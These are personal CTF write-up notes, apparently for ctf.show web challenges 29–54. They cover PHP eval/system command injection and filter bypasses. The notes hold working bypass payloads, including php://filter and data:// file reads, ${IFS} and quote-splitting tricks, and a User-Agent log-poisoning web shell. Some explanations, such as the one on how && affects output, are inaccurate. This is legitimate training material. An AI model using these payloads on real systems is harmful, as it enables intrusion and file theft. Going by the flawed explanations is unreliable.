# Web 29
![[Pasted image 20240821155539.png]]
能执行`$_GET['c']`中的语句，但是这个语句中不能存在`flag`这个单词。
我们先看看有啥：
![[Pasted image 20240821155629.png]]
最终还是要让我们输出`flag.php`：
![[Pasted image 20240821160130.png]]
# Web 30
![[Pasted image 20240821161009.png]]
![[Pasted image 20240821161455.png]]
# Web 31
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 00:49:10  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){  
        eval($c);  
    }  
}else{
	highlight_file(__FILE__);  
}
```


用`/?c=passthru("tac%09fl*")`中的`%09`也就是`TAB`键代替空格`%20`
![[Pasted image 20240822091817.png]]
或者
`?c=show_source(scandir(getcwd())[2]);`
![[Pasted image 20240822092155.png]]
# Web 32
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 00:56:31  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){  
        eval($c);  
    }
}else{
	highlight_file(__FILE__);  
}
```

访问网站的时候用这个payload.
```
c=$nice=include$_GET[url]?>&url=php://filter/read=convert.base64-
encode/resource=flag.php
```
- `include` 是 PHP 的一个函数，它会将指定文件的内容嵌入到当前脚本中执行。
- #### **恶意 `url` 参数**
```php
url=php://filter/read=convert.base64-encode/resource=flag.php
```
这部分代码的含义如下：
- `php://filter/`：PHP 提供的一种特殊的流，可以在访问文件时应用各种过滤器（filters）。`php://filter` 允许你对文件的内容进行操作（如编码、解码等）。
- `read=convert.base64-encode/`: 这是一种过滤器链，它会读取文件内容，并在读取时将内容转换为 Base64 编码。
- `resource=flag.php`：这是被读取和编码的实际文件，表示目标是服务器上的 `flag.php` 文件。
# Web 33
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 02:22:27  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
//  
error_reporting(0);  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){  
        eval($c);  
    }
}else{
	highlight_file(__FILE__);  
}
```
用下面这个恶意代码，就可以了。
```Bash
https://86396f60-51bc-4fed-9613-4845a4e2675f.challenge.ctf.show/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```
![[Pasted image 20240824194452.png]]
![[Pasted image 20240824194518.png]]
# Web 34
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 04:21:29  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){  
        eval($c);  
    }
}else{
	highlight_file(__FILE__);  
}
```

同样的招没啥变化
![[Pasted image 20240824195533.png]]
![[Pasted image 20240824195628.png]]
# Web 35
![[Pasted image 20240824201251.png]]
这次我用用nginx日志文件
URL:
```
https://794ac7d7-087e-4e53-be4d-8497df5b083a.challenge.ctf.show/?c=include$_GET[a]?%3E&a=/var/log/nginx/access.log
```
HackBar上在User-Agent上插入一句话木马，让密码为`a`。
![[Pasted image 20240824202246.png]]
中国蚁剑连上背后的靶机：
![[Pasted image 20240824202436.png]]
已经看到了！
![[Pasted image 20240824202537.png]]
# Web 36
已经没啥挑战了，千篇一律：
![[Pasted image 20240824202937.png]]
# Web 37
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 05:18:55  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c);  
        echo $flag;  
      
    }      
}else{
	highlight_file(__FILE__);  
}
```
这个命令太牛逼了，换成include不能用之前的东西了，这个还是可以：
```Bash
{URL}/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
```
![[Pasted image 20240824204216.png]]
# Web 38
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 05:23:36  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/flag|php|file/i", $c)){  
        include($c);  
        echo $flag;  
    }  
}else{
	highlight_file(__FILE__);  
}
```
方法也是
```Bash
{URL}/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
```
# Web 39
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 06:13:21  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c.".php");  
    }  
}else{
	highlight_file(__FILE__);  
}
```
不用管`include()`里面的那个`.php`，只要我们闭合了`$c`中的PHP代码，那后面的也不会有用。
所以我们使用：
```bash
https://d3b86d58-9281-4fe3-a43b-548e57f31ecc.challenge.ctf.show/?c=data://text/palin,%3C?php%20system(%22tac%20fl*.php%22);%20?%3E
```
就可以了。
# Web 40
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 06:03:36  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
*/  
  
  
if(isset($_GET['c'])){
	$c = $_GET['c'];  
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){  
        eval($c);  
    }      
}else{
	highlight_file(__FILE__);  
}
```

先看文件目录：
```
{URL}/?c=var_dump(scandir(pos(localeconv())));
```
![[Pasted image 20240824213038.png]]
- 通常，`localeconv()` 返回的第一个元素可能是 `decimal_point` 键，其值为小数点符号（例如，`"."`）。
- `scandir(pos(localeconv()))` 可能相当于 `scandir(".")`，即列出当前目录的内容。
- **`var_dump()`** 输出 `scandir()` 的返回结果。
然后再`show_source()`
```
{URL}/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```
![[Pasted image 20240824212907.png]]
# Web 41
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: 羽  
# @Date:   2020-09-05 20:31:22  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 22:40:07  
# @email: 1341963450@qq.com  
# @link: https://ctf.show  
  
*/  
  
if(isset($_POST['c'])){
	$c = $_POST['c'];  
	if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){  
        eval("echo($c);");  
    }  
}else{
	highlight_file(__FILE__);  
}  
?>
```
PHP中的`"/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i"`和`'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i'`一定是有区别的。
记得`https://{URL}`换成`http://{URL}`
![[Pasted image 20240903105234.png]]
# Web 42
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 20:51:55  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];    
	system($c." >/dev/null 2>&1");  
}else{
	highlight_file(__FILE__);  
}
```


```
/dev/null 2>&1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显  
; //分号  
| //只执行后面那条命令  
|| //只执行前面那条命令  
& //两条命令都会执行  
&& //两条命令都会执行
```
用分号把后面的东西当作注释就可以了。
![[Pasted image 20240904170057.png]]
![[Pasted image 20240904170856.png]]
# Web 43
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 21:32:51  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat/i", $c)){
            system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```
过滤了`cat`、`;`，
那就利用`tac`命令来打印，`||`分割。
![[Pasted image 20240905145742.png]]
![[Pasted image 20240905145802.png]]
# Web 44
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 21:32:01  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){    $c=$_GET['c'];  
    if(!preg_match("/;|cat|flag/i", $c)){        system($c." >/dev/null 2>&1");  
    }  
}else{    highlight_file(__FILE__);  
}
```

![[Pasted image 20240905150742.png]]
![[Pasted image 20240905150805.png]]
# Web 45
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 21:35:34  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| /i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```
![[Pasted image 20240905151413.png]]
`%09`代替空格
![[Pasted image 20240905151608.png]]
# Web 46
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 21:50:19  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```

# Web 47
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 21:59:23  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```

![[Pasted image 20240906110025.png]]
把ls的结果丢弃，前面的保留。
# Web 48
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 22:06:20  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```

![[Pasted image 20240906114401.png]]
# Web 49
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 22:22:43  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```
Use `%09` replace the `Tab`, Use `tac` to replace the `cat`, use %?% to complete the `flag.php`.
So we use `/?c=tac%09fla?.php`.
Then we use `||ls` to avoid the pipeline `>/dev/null 2>&1`.
All in all, `/?c=tac%09fla?.php||ls`
==Why not `&&` but `||`?==
这两条URL命令的行为不同是因为 **`||`** 和 **`&&`** 是在Unix/Linux Shell中具有不同含义的逻辑运算符。它们的工作原理决定了为什么前者能够显示 `flag.php` 的内容，而后者不能。

### 1. **`||` 和 `&&` 的含义**

- **`||`** （逻辑或）：表示**如果前一个命令执行失败**（返回非零退出状态码），那么才会执行后面的命令。
- **`&&`** （逻辑与）：表示**只有前一个命令执行成功**（返回零退出状态码），后面的命令才会执行。

### 2. **URL中的命令分析**

#### **前者：`URL/?c=tac%09fla?.php||ls>/dev/null 2>&1`**

解码后是：
```bash
tac	fla?.php || ls > /dev/null 2>&1
```

- **`tac	fla?.php`**：`tac` 命令用于从文件末尾开始逐行输出内容，而 `%09` 是一个制表符，虽然可能影响文件名匹配，但在此我们假设 `fla?.php` 匹配到了目标文件 `flag.php`。`?` 通配符代表单个字符，所以 `fla?.php` 可能匹配到 `flag.php`。

  如果这个命令成功执行（即找到了 `flag.php` 文件并成功输出），那么 **`||`** 后面的 `ls > /dev/null 2>&1` 不会执行，因为 `||` 逻辑意味着 **只有前一个命令失败时，才会执行后面的命令**。

- **`ls > /dev/null 2>&1`**：如果 `tac` 命令执行失败（如文件不存在或路径错误），则 `ls` 会被执行，但它的输出会被重定向到 `/dev/null`，也就是说结果不会显示在终端中。

所以在这种情况下，`tac	fla?.php` 如果匹配到了 `flag.php`，则会成功输出 `flag.php` 的内容，后续的 `ls` 不会执行。

#### **后者：`URL/?c=tac%09fla?.php&&ls>/dev/null 2>&1`**

解码后是：
```bash
tac	fla?.php && ls > /dev/null 2>&1
```

- **`tac	fla?.php`**：同样，`tac` 尝试从 `fla?.php` 中输出内容。如果文件存在并且命令成功执行，Shell 会继续执行后面的 `ls` 命令。

- **`ls > /dev/null 2>&1`**：`&&` 的含义是只有前一个命令执行成功，才会继续执行后面的命令。即使 `tac	fla?.php` 成功了，`ls` 也会执行，但由于输出被重定向到 `/dev/null`，你不会看到任何结果。

因此，在这种情况下，即使 `tac` 成功执行并输出了 `flag.php` 的内容，`ls` 的执行会覆盖输出，且结果被重定向到 `/dev/null`，导致你看不到 `flag.php` 的内容。

### 3. **执行结果的区别**

- **`||` 的效果**：如果 `tac	fla?.php` 成功执行并找到了 `flag.php`，则输出文件内容，`ls` 不会执行。
- **`&&` 的效果**：即使 `tac	fla?.php` 成功执行并输出了内容，`ls > /dev/null 2>&1` 也会执行并覆盖输出，因此你不会看到 `flag.php` 的内容。

### 总结

- 在 `||` 情况下，**只有 `tac	fla?.php` 失败时**，才会执行 `ls > /dev/null 2>&1`，如果 `tac` 成功了，文件内容将显示。
- 在 `&&` 情况下，**即使 `tac	fla?.php` 成功了**，`ls > /dev/null 2>&1` 也会执行，并且你不会看到任何输出，因为 `ls` 的结果被重定向到 `/dev/null`。

因此，前者能够显示 `flag.php` 的内容，而后者则无法显示。
==Why `%` can be used at the first part?==
![[Pasted image 20240913121907.png]]
![[Pasted image 20240913121923.png]]
# Web 50
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 22:32:47  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```

在URL参数 `/?c=tac<fla%27%27g.php||` 中，符号 `<` 和 `%27` 分别有特定的作用或编码。我们逐步分析每个符号的含义。

### 1. **`<` 符号**

在这个URL中，`<` 是一个用于重定向输入的符号，特别是在Unix/Linux中的Shell命令中，它是 **输入重定向符**，用于将文件的内容作为输入传递给某个命令。

#### 解释：
- **`<`** 通常用于Shell命令行，用于从文件读取输入。例如：
  
  ```bash
  tac < file.txt
  ```

  上述命令会执行 `tac`，并将 `file.txt` 的内容作为 `tac` 命令的输入。`tac` 命令是 `cat` 命令的反向，它会从文件末尾到开头逐行输出内容。

- **在你的URL中：**
  
  `tac<fla%27%27g.php` 表示 `tac` 命令的输入应该从文件 `fla''g.php` 读取。这里 `fla%27%27g.php` 被作为文件名传递给 `tac`，通过 `<` 将文件内容重定向给 `tac`。

### 2. **`%27` 符号**

`%27` 是URL编码中的表示，代表单引号（`'`）。

#### 解释：
- 在URL中，`%27` 是 **单引号字符 `'`** 的URL编码。URL中使用百分号编码来表示特殊字符，这样可以确保URL在传输中不丢失或损坏。
- **双 `%27%27`**：在你的URL中，`%27%27` 相当于两个连续的单引号 `''`。

#### 为什么使用两个单引号？
在某些情况下，双单引号（`''`）可以用于逃逸字符，特别是用来绕过某些安全过滤机制。攻击者可以通过双引号绕过正则表达式的过滤，避免正则表达式识别出某些危险字符串，例如在此例中可能尝试绕过对 `flag.php` 的检测。

### 3. **整个输入的解释**

假设我们在Linux环境下使用Shell，URL中的 `tac<fla%27%27g.php||` 实际传递给服务器的参数（解码后的）是：

```
tac<fla''g.php||
```

#### 分解解释：
1. **`tac<fla''g.php`**：
   - `tac` 命令试图读取文件 `fla''g.php` 作为输入，其中 `%27%27` 被解码为 `''`。这可能是为了绕过一些针对 `flag` 关键词的过滤机制。
   - `<` 是输入重定向符号，意味着 `tac` 命令会读取 `fla''g.php` 文件的内容并进行处理。

2. **`||` 符号**：
   - `||` 是 **逻辑或运算符**，用于Shell命令行中表示逻辑“或”。这意味着如果 `tac<fla''g.php` 执行失败，Shell会尝试执行接下来的命令。在这里没有给出下一个命令，可能是为了进一步进行命令注入。

### 4. **目的与绕过正则的动机**

在你最初提到的代码中，`preg_match` 用来检测并阻止潜在的危险命令。然而，使用 `%27%27` 来代替单引号 `'`，并使用 `tac` 和重定向符 `<`，很可能是为了绕过正则表达式中对 `cat` 或 `flag` 等关键词的检测。

- **`fla''g.php`**：通过将 `flag` 变形为 `fla''g`，攻击者试图绕过正则中的对 `flag` 的检测。
- **`<` 输入重定向**：通过使用重定向符号 `<`，攻击者可以尝试读取文件内容并将其作为输入传递给命令。

### 5. **改进安全防御**

要避免这种绕过正则表达式的攻击，你需要：

1. **加强正则表达式**：除了检测 `flag` 这样的关键词外，还应该检测变形的关键字模式，比如包含双引号、转义字符等变形手段。
   
   **示例：**
   ```php
   if (preg_match("/\;|cat|flag|fla[a-zA-Z0-9]*g| |\$|\*|\||\&|\<|\>|curl|\`|\%/i", $c)) {
       // 如果匹配，则阻止执行
   }
   ```

2. **避免直接使用用户输入的命令**：使用 `escapeshellcmd()` 或 `escapeshellarg()` 来处理和转义用户输入的命令，避免直接将用户输入传递给 `system()` 或 `exec()` 函数。

3. **严格限制输入**：如果可能，限定允许的命令集，只允许特定的安全命令，并严格验证输入参数的合法性。

### 总结

- **`<`** 是输入重定向符号，用于将文件内容作为命令输入。
- **`%27%27`** 是两个URL编码的单引号（`'`），可能用于绕过正则表达式对危险字符串的检测。
- 这个输入可能是一次尝试通过文件操作命令进行攻击的命令注入，攻击者试图通过变形的命令绕过检测机制来读取特定文件。
![[Pasted image 20240913122522.png]]
# Web 51
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 22:42:52  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```
vs
```PHP
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```
多了一个`tac`的过滤，那么我们就要使用`nl`， 是一个用于给文件或标准输入的每一行添加行号的命令。它的全称是 **number lines**。
**`nl`** 命令会将带有行号的文件内容输出到控制台（标准输出）。默认情况下，`nl` 读取文件并在每一行的前面添加行号，然后将结果显示在控制台中。你也可以将这个输出重定向到其他文件或使用管道传递给其他命令。
![[Pasted image 20240913180909.png]]
# Web 52
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-05 22:50:30  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
	    system($c." >/dev/null 2>&1");  
    }  
}else{
	highlight_file(__FILE__);  
}
```
![[Pasted image 20240913182538.png]]
URL `?c=ca\t${IFS}/fla%27%27g` 包含了一些特殊字符和Shell变量，经过URL解码和Shell解析后，会表现出特定的行为。让我们逐步分析该URL如何被解析。

### 1. **URL 解码**

URL中的 `%27` 是 **单引号（'）** 的 URL 编码。在解析该URL时， `%27%27` 实际上解码为两个单引号（`''`）。因此，经过解码后，URL参数变为：

```
ca\t${IFS}/fla''g
```

### 2. **Shell 解析**

#### 1. **`\t` (制表符)**

`\t` 是制表符的转义字符。在Shell中，如果你输入的是 `ca\t`，Shell将会将其解析为 **制表符**（tab）。如果 `\t` 没有被转义为文本字符串，它会在解析时被看作是制表符。这可能影响命令的解释：

- 如果命令行中有制表符，Shell会处理这个制表符，并可能将其解释为命令和参数之间的分隔符。

因此，`ca\t` 在Shell中会变成 `ca<tab>`，这可能导致Shell无法正确识别 `ca` 作为命令。

#### 2. **`${IFS}` (Internal Field Separator)**

`$IFS` 是Shell中的特殊变量，代表 **Internal Field Separator（内部字段分隔符）**，用于在Shell中分隔命令行中的各个部分。默认情况下，`IFS` 包含 **空格、制表符和换行符**。

- 在命令行中，`${IFS}` 将被替换为空格（或当前 `IFS` 的值）。
- `${IFS}/` 表示一个空格或制表符之后紧跟一个 `/`。

因此，`${IFS}/` 会变成一个空格和路径分隔符 `/`，这会影响路径的解析。

#### 3. **`fla''g`**

`fla''g` 实际上是通过双单引号（`''`）对原始字符串进行了变形。双单引号在Shell中不会改变字符串的内容，因此 `fla''g` 实际上还是被解释为 `flag`。

这种变形的目的是可能用于绕过某些过滤机制。例如，如果正则表达式或安全过滤器检测 `flag`，这种变形方式可能逃避匹配，因为它使用了两个连续的单引号。

### 3. **总结：解析后的结果**

URL `?c=ca\t${IFS}/fla%27%27g` 在经过Shell的解析后，会变成如下的形式：

```
ca<tab> <IFS>/flag
```

具体来说：
- **`ca\t`**：会变成 `ca` 后跟一个制表符（Tab字符）。这可能会影响Shell命令的解释，视环境而定，可能导致Shell无法识别 `ca` 命令。
- **`${IFS}/`**：`${IFS}` 会被替换为一个空格，后面紧跟一个 `/`，将路径拆分为多个部分。
- **`fla''g`**：经过双单引号的变形，`fla''g` 最终会被解释为 `flag`，可能用于绕过某些过滤器。

### 4. **可能的用途**

这种构造方式通常用于**命令注入**攻击或试图绕过Web应用程序中的安全过滤器：

1. **绕过命令过滤**：通过变形来逃避检测，例如将 `flag` 变为 `fla''g`。
2. **操纵Shell命令解析**：使用制表符、空格或 `${IFS}` 来影响Shell如何解析命令或路径，可能试图利用输入重定向等Shell功能。
3. **读取敏感文件**：试图通过 `cat` 或类似命令读取 `flag` 文件。

### 总结：
解析后的结果可以理解为：
```bash
ca<tab> /flag
```
这个命令可能用于绕过某些防护机制，尤其是在Web应用程序中试图读取 `flag` 文件或执行命令注入时。

# Web 53
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-07 18:21:02  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){  
        echo($c);
        $d = system($c);  
        echo "<br>".$d;  
    }else{  
        echo 'no';  
    }  
}else{
	highlight_file(__FILE__);  
}
```

![[Pasted image 20240915115114.png]]
第一个ls是我们给的命令，
后面有几个文件
- `flag.php`
- `index.php`
- `readflag`
用`nl`试一下
`nl${IFS}fla''g.php`
![[Pasted image 20240915115445.png]]
这个有点牛逼。
# Web 54
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: Lazzaro  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-07 19:43:42  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
	    system($c);  
    }
}else{
	highlight_file(__FILE__);  
}
```
在正则表达式中，`.*` 的含义是 **匹配任意长度的任意字符**，包括零个或多个字符。

### 分解说明：
1. **`.`（点号）**：表示匹配**任意单个字符**，除了换行符（除非在某些模式下开启了允许匹配换行符的选项，如 `DOTALL` 模式）。换句话说，`.` 可以匹配除了换行符之外的任何字符。

2. **`*`（星号）**：表示**匹配前面的字符零次或多次**。它的意思是重复前面的元素任意次，包括零次。

### 组合 `.*` 的含义：
- `.` 匹配任意单个字符。
- `*` 表示匹配前面的字符（即任意字符）**零次或更多次**。

因此，`.*` 组合起来的意思是 **匹配任意长度的任意字符**，可以是空字符串，也可以是多个字符的字符串。

### 示例：
1. **匹配任意内容：**
   - 正则表达式：`.*`
   - 能匹配：
     - 空字符串 `""`
     - `abc`
     - `hello world!`
     - 等等，任意长度的字符串。

2. **实际应用：**
   - 例如，假设你有一个字符串 `"abc123"`，并使用正则表达式 `a.*3`，它会匹配从 `a` 开始到 `3` 结束的所有字符：
     - 正则表达式：`a.*3`
     - 匹配：`abc123`（匹配整个字符串）

### 注意：
- 在一些模式下（如 **DOTALL** 模式），`.` 也可以匹配换行符，这样 `.*` 就可以匹配跨越多行的文本。
![[Pasted image 20240915202751.png]]
复制：
`/?c=mv${IFS}fla?.php${IFS}t.txt`
输出：
`/?c=uniq${IFS}t.txt`
## `uniq`
`uniq` 是 Linux 和 Unix 系统中的一个命令，用于**去除重复的行**，并输出**唯一的行**。`uniq` 只能处理**相邻的重复行**，因此它通常与 `sort` 命令一起使用，先对文件内容进行排序，再使用 `uniq` 去除重复行。

### 语法：
```bash
uniq [选项] [输入文件] [输出文件]
```

- **输入文件**：可选，指定要处理的文件。如果不指定，默认从标准输入（stdin）读取数据。
- **输出文件**：可选，指定将处理结果输出到哪个文件。如果不指定，默认输出到标准输出（stdout）。

### 常用选项：
- **`-c`**：在输出的每一行前显示该行出现的次数。
- **`-d`**：只输出重复的行。
- **`-u`**：只输出不重复的行。
- **`-i`**：忽略大小写的区别。
- **`-f N`**：忽略每行的前 `N` 个字段（以空格或Tab作为字段分隔符）。
- **`-s N`**：忽略每行前 `N` 个字符，进行比较。
- **`-z`**：使用 `NUL` 字符作为行分隔符，而不是换行符。

### 使用示例：

#### 1. 去除相邻的重复行：
